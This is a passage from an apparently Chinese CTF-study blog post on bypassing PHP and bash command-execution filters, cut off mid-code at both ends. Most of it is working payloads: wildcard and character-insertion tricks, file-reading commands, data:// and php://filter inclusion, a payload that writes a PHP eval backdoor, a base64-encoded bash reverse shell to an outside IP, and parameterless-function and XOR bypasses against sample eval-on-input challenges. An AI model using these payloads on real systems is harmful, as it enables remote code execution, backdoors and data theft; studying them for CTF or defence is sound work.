class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stata">?：匹配一个字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>??<br><br><span class="hljs-comment">*：匹配一个或多个任意字符#cat fl*</span><br><br>[<span class="hljs-keyword">list</span>]：匹配<span class="hljs-keyword">list</span>内的任意单个字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>[a]<span class="hljs-keyword">g</span>   例如[@-[]可以表示大写字母<br><br>[!<span class="hljs-keyword">list</span>] or [ ^<span class="hljs-keyword">list</span>]：匹配<span class="hljs-keyword">list</span>外的任意单个字符#<span class="hljs-keyword">cat</span> fla[s]<br><br>&#123;s1,s2,s3,...&#125;：匹配s1，s2，s3或者其它更多字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>&#123;a,b&#125;<span class="hljs-keyword">g</span><br><br><br><span class="hljs-comment">//用通配符匹配tmp目录下的临时session文件</span><br><span class="hljs-keyword">file</span>=/???/????????[@-[]<br></code></pre></td></tr></table></figure><h3 id="可插入字符"><a href="#可插入字符" class="headerlink" title="可插入字符"></a>可插入字符</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mel">l&lt;s<br>l&lt;&gt;s<br>ca<span class="hljs-string">&quot;&quot;</span>t<br>ca<span class="hljs-string">&#x27;&#x27;</span>t<br>ca<span class="hljs-string">``</span>t<br>ca\t<br>a=c;b=at;$a$b xxx.php    # 变量拼接<br>c$&#123;u&#125;at                  # 因为c$uat 系统不知道你要执行的是$u还是$uat，因此加上界定符，命令成功运行<br>l<span class="hljs-string">`$u`</span>s<br>wh$1oami<br>who$@ami<br>whoa$*mi<br></code></pre></td></tr></table></figure><h3 id="bash读取文件命令"><a href="#bash读取文件命令" class="headerlink" title="bash读取文件命令"></a>bash读取文件命令</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sqf">cat <span class="hljs-built_in">flag</span><span class="hljs-comment">// 正序输出所有内容</span><br>tac <span class="hljs-built_in">flag</span><span class="hljs-comment">// 从最后一行开始倒序输出所有内容</span><br>php <span class="hljs-built_in">flag</span><span class="hljs-comment">// php读取</span><br>head <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件前若干行（需要加参数 -n）</span><br>tail <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件后若干行（需要加参数 -n）</span><br>more <span class="hljs-built_in">flag</span><span class="hljs-comment">// 按页读文件</span><br>less <span class="hljs-built_in">flag</span><span class="hljs-comment">// 好像和more差不多</span><br>nl <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件顺便显示行号</span><br>od <span class="hljs-built_in">flag</span><span class="hljs-comment">// 一般用od -c flag</span><br>file -f <span class="hljs-built_in">flag</span><span class="hljs-comment">// 利用file报错出flag</span><br><span class="hljs-built_in">sort</span> <span class="hljs-built_in">flag</span><span class="hljs-comment">// 按首列ascii排序后输出</span><br>uniq <span class="hljs-built_in">flag</span><span class="hljs-comment">// 删除重复出现的行列</span><br>paste <span class="hljs-built_in">flag</span><span class="hljs-comment">// 合并文件的行列并输出</span><br>diff <span class="hljs-built_in">flag</span> file<span class="hljs-comment">// 对比flag和file的不同</span><br>bzmore <span class="hljs-built_in">flag</span><span class="hljs-comment">// 将bzip压缩过的文件解压后输出</span><br>bzless <span class="hljs-built_in">flag</span><span class="hljs-comment">// bzmore增强版</span><br>curl file:<span class="hljs-comment">///flag// file协议读</span><br>sed -n <span class="hljs-string">&#x27;1,2p&#x27;</span> <span class="hljs-built_in">flag</span><span class="hljs-comment">// 1，2表示显示1~2行，可以不要</span><br>strings <span class="hljs-comment">//字符串形式查看文件</span><br>grep  <span class="hljs-comment">//例如 grep test *php strings 表示查找并打印出以php为后缀的文件中包含字符串test的行</span><br></code></pre></td></tr></table></figure><h3 id="php文件读取函数"><a href="#php文件读取函数" class="headerlink" title="php文件读取函数"></a>php文件读取函数</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mel">#通过单一函数读取文件<br>c=echo file_get_contents(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=readfile(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=var_dump(<span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>c=print_r(<span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>#这里做一个解释<span class="hljs-string">`file — 把整个文件读入一个数组中`</span><br>#通过<span class="hljs-keyword">fopen</span>去读取文件内容，这里介绍下函数<br><span class="hljs-keyword">fread</span>()<br>fgets()<br>fgetc()<br>fgetss()<br>fgetcsv()<br>gpassthru()<br><br>一些payload:<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgets($a);echo $line;&#125;#一行一行读取<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgetc($a);echo $line;&#125;#一个一个字符读取<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload1:c=system(<span class="hljs-string">&quot;nl fla?????&quot;</span>);<br>payload2:c=system(<span class="hljs-string">&quot;nl fla*&quot;</span>);<br>payload3:c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl<span class="hljs-string">&#x27;&#x27;</span>ag.php`;    或者c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl“”ag.php`;<br>payload4:c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl\ag.php`;    <span class="hljs-comment">#转义字符绕过</span><br>payload5:c=include(<span class="hljs-variable">$_GET</span>[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>payload6:c=<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_GET</span>[1]);&amp;1=system(<span class="hljs-string">&#x27;nl flag.php&#x27;</span>);<br>payload7:c=awk <span class="hljs-string">&#x27;&#123;printf $0&#125;&#x27;</span> flag.php&#124;&#124;<br></code></pre></td></tr></table></figure><h2 id="Bypass技巧"><a href="#Bypass技巧" class="headerlink" title="Bypass技巧"></a>Bypass技巧</h2><h3 id="1-bash进制转换、编码"><a href="#1-bash进制转换、编码" class="headerlink" title="1.bash进制转换、编码"></a>1.bash进制转换、编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">//16进制编码、解码<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cat flag&quot;</span>&#124;xxd -p   <span class="hljs-comment"># encode</span><br>63617420666c61670a<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63617420666c61670a&quot;</span>&#124;xxd -r -p   <span class="hljs-comment"># decode</span><br><span class="hljs-built_in">cat</span> flag<br><br>//8进制执行<br>$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\154\163&quot;</span>)  <span class="hljs-comment">#ls</span><br><br>//base64编码、解码<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cat flag&quot;</span> &#124; <span class="hljs-built_in">base64</span>  <span class="hljs-comment"># encode</span><br>Y2F0IGZsYWcK<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWcK&quot;</span> &#124; <span class="hljs-built_in">base64</span> -d  <span class="hljs-comment"># decode</span><br><span class="hljs-built_in">cat</span> flag<br><br>`<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Y2F0Cg==&#x27;</span> &#124; <span class="hljs-built_in">base64</span> -d` flag.txt     <span class="hljs-comment"># &quot;Y2F0Cg==&quot; 解码后是cat</span><br><br></code></pre></td></tr></table></figure><p>如果加上直接执行的话就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#16进制</span><br><span class="hljs-built_in">echo</span> &lt;hexString&gt;&#124;xxd -r -p&#124;bash<br><span class="hljs-comment">#base64</span><br><span class="hljs-built_in">echo</span> &lt;base64String&gt;&#124;<span class="hljs-built_in">base64</span> -d&#124;bash<br><span class="hljs-comment">#base64反弹shell: bash -i &gt;&amp; /dev/tcp/101.33.203.2/4444 0&gt;&amp;1</span><br>bash -c &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMzMuMjAzLjIvNDQ0NCAwPiYx&#125;&#124;&#123;<span class="hljs-built_in">base64</span>,-d&#125;&#124;&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><h3 id="2-bash内联执行"><a href="#2-bash内联执行" class="headerlink" title="2.bash内联执行"></a>2.bash内联执行</h3><p>将输出作为输入执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$() 代表执行括号中语句的执行结果，反引号类似。</span><br><br>$(<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cat flag&#x27;</span>)<br><br>`<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cat flag&#x27;</span>`<br></code></pre></td></tr></table></figure><h3 id="3-bin目录"><a href="#3-bin目录" class="headerlink" title="3.bin目录"></a>3.bin目录</h3><p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>?at<span class="hljs-variable">$&#123;IFS&#125;</span>f???????  <span class="hljs-comment">#cat flag.php</span><br><span class="hljs-regexp">/bin/</span>base64<br></code></pre></td></tr></table></figure><h3 id="3-cp-mv-改文件名"><a href="#3-cp-mv-改文件名" class="headerlink" title="3.cp mv 改文件名"></a>3.cp mv 改文件名</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp fla?.php <span class="hljs-number">1</span>.txt<br>mv fla?.php <span class="hljs-number">1</span>.txt<br><span class="hljs-regexp">//</span>另外使用php函数也可以改文件名<br>c=rename(<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后访问1.txt</p><h3 id="4-文件包含二次传参"><a href="#4-文件包含二次传参" class="headerlink" title="4.文件包含二次传参"></a>4.文件包含二次传参</h3><p>可以使用include、require来构造文件包含读文件。</p><p>%0a用于换行绕过，另外<strong>include可以不使用()使用?&gt;闭合。</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php //伪协议读</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">   //写文件</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== //base64写文件</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;hack&#x27;]);?&gt;&quot;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> //写后门</span><br><span class="language-xml"></span><br><span class="language-xml">//require和include一样</span><br><span class="language-xml">c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><h3 id="5-短标签"><a href="#5-短标签" class="headerlink" title="5.短标签"></a>5.短标签</h3><p>写shell bypass较常用。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">//</span><span class="language-php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> :短标签,相当于</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> ,也可以写成</span><span class="language-php"><span class="hljs-meta">&lt;?</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 例如：</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?</span><span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`cat%<span class="hljs-number">09</span>/flag`<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="6-无参函数绕过"><a href="#6-无参函数绕过" class="headerlink" title="6.无参函数绕过"></a>6.无参函数绕过</h3><p><a href="https://www.cnblogs.com/pursue-security/p/15406272.html">https://www.cnblogs.com/pursue-security/p/15406272.html</a></p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/110840156">https://blog.csdn.net/weixin_46330722/article/details/110840156</a></p><p>有时候会遇到如下类型的过滤：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <br>    <span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>])<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>意思就是传入的函数必须是无参执行的，像phpinfo()之类。</p><p>我们绕过的思路就是利用php的一些无参函数的返回值，一层层嵌套执行。</p><h4 id="getallheaders-、end-、implode"><a href="#getallheaders-、end-、implode" class="headerlink" title="getallheaders() 、end()、implode()"></a>getallheaders() 、end()、implode()</h4><p><strong>注：此姿势仅限于apache可以使用。</strong></p><p>getallheaders()顾名思义是获取所有请求头信息，并以数组形式返回。</p><p>end()是取数组中最后一个元素值。</p><p>impode是将数组元素连接成为一个字符串。</p><p>用这三个函数我们可以<strong>提取请求头参数值来命令执行</strong>。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-comment">//请求头部最后添加 spring : phpinfo();//</span><br><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">getallheaders</span>()))</span><br><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">implode</span>(<span class="hljs-title">getallheaders</span>()))</span><br></code></pre></td></tr></table></figure><h4 id="get-defined-vars-、current-、end"><a href="#get-defined-vars-、current-、end" class="headerlink" title="get_defined_vars() 、current()、end()"></a>get_defined_vars() 、current()、end()</h4><p>这种方式就更通用一些。</p><p>get_defined_vars():获取四个超全局变量GET 、POST、FILES、COOKIE，并以二维数组的形式返回。</p><p>current():可以<strong>将二位数组转换成一维数组</strong>并返回数组中的当前单元；默认是GET中的第一个。</p><p>我们可以使用end(current(get_defined_vars()))获取传递的最后一个GET参数值，然后eval执行</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">current</span>(<span class="hljs-title">get_defined_vars</span>())))&amp;<span class="hljs-variable">spring</span>=<span class="hljs-title">phpinfo</span>();</span><br><span class="hljs-function"><span class="hljs-comment">//spring的值被前面获取到并执行</span></span><br></code></pre></td></tr></table></figure><h4 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h4><p>session_id()函数用于返回当前会话PHPSESSID的值，当然需要先执行session_start()来开启session。</p><p>然后我们在PHPSESSID中写入恶意代码就可以被获取到并执行。</p><p>但要注意PHPSESSID只允许[A-Za-z0-9]，因此我们还要将恶意代码转换成16进制再用hex2bin解码。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs leaf">赋值PHPSESSID=706870696e666f28293b  <span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">phpinfo</span><span class="hljs-params">()</span></span>;<br>code=eval(hex2bin(session_id(session_start())))<br></code></pre></td></tr></table></figure><h4 id="PHP函数直接读文件"><a href="#PHP函数直接读文件" class="headerlink" title="PHP函数直接读文件"></a>PHP函数直接读文件</h4><p>以一道题目为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/&#124;filter:\/\/&#124;php:\/\/&#124;phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et&#124;na&#124;info&#124;dec&#124;bin&#124;hex&#124;oct&#124;pi&#124;log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据过滤来看前面三种都不能用了，因此要换个思路。</p><blockquote><p>localeconv():返回一个包含本地数字及货币格式信息的数组，重点在于<strong>返回数组第一个元素是 <code> .</code></strong> ，因此我们用current取出<code>.</code>来读取当前目录。</p><p>scandir():列出目录中的文件和目录</p><p>pos():和current()一样输出数组中当前元素的值。</p><p>关于数组操作还有一些函数：</p><ul><li><a href="https://www.php.net/manual/zh/function.end.php">end()</a> - 将数组的内部指针指向最后一个单元</li><li><a href="https://www.php.net/manual/zh/function.key.php">key()</a> - 从关联数组中取得键名</li><li><a href="https://www.php.net/manual/zh/function.each.php">each()</a> - 返回数组中当前的键／值对并将数组指针向前移动一步</li><li><a href="https://www.php.net/manual/zh/function.prev.php">prev()</a> - 将数组的内部指针倒回一位</li><li><a href="https://www.php.net/manual/zh/function.reset.php">reset()</a> - 将数组的内部指针指向第一个单元</li><li><a href="https://www.php.net/manual/zh/function.next.php">next()</a> - 将数组中的内部指针向前移动一位</li></ul><p>chdir():用于跳出目录，比如进入上一层目录就需要chdir(“..”)</p><p>array_reverse():翻转数组，有时候需要的元素太靠后可以用它。</p></blockquote><p>我们据此构造出payload:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">exp=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))) <span class="hljs-comment">//打印当前目录下的文件</span><br>exp=print<span class="hljs-constructor">_r(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))))) <span class="hljs-comment">//获取倒数第二个文件名</span><br>exp=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))))  <span class="hljs-comment">//读取文件内容</span><br></code></pre></td></tr></table></figure><h3 id="7-无字母无数字"><a href="#7-无字母无数字" class="headerlink" title="7.无字母无数字"></a>7.无字母无数字</h3><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>以下面这段代码为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]&#124;[a-z]&#124;\`&#124;\+&#124;\~&#124;\$&#124;\[&#124;\]&#124;\&#123;&#124;\&#125;&#124;\&amp;&#124;\-/i&#x27;</span>, <span class="hljs-variable">$c</span>)) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了绝大多数字符，但我们可以<strong>使用没有被过滤的字符两两异或</strong>来获取被过滤的字符。贴个羽师傅的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//异</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> 